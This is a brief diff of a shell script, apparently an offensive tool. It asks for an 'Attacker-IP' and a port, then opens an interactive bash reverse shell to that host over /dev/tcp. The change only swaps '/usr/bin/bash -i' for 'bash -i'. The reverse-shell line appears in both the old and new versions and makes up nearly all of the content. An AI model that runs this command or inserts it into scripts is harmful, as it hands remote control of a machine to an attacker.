@@ -14,4 +14,4 @@ echo
 read -p "Enter Attacker-IP: " attip
 read -p "Enter Port: " PortSet
 echo
-/usr/bin/bash -i >& /dev/tcp/$attip/$PortSet 0>&1
+bash -i >& /dev/tcp/$attip/$PortSet 0>&1
